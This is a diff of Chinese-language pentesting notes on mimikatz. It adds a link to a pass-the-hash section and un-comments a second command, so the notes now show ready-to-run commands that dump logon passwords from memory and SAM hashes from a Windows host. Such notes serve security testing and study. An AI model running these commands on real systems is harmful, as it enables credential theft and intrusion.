@@ -25,11 +25,12 @@ mimikatz For Win10T 载:
 
 https://github.com/gentilkiwi/mimikatz/releases
 
-本地非交互式凭证获取:
+### 常用命令
+[PTH攻击](17_domain_%E5%9F%9F.md#mimikatz-pth-%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB)
 
-```ts
+```sh
 mimikatz.exe "log logon.txt" "privilege::debug" "sekurlsa::logonpasswords" "exit"
-// mimikatz.exe "log res.txt" "privilege::debug" "token::elevate" "lsadump::sam" "exit"
+mimikatz.exe "log logon.txt" "privilege::debug" "token::elevate" "lsadump::sam" "exit"
 ```
 
 **1x 版本:**
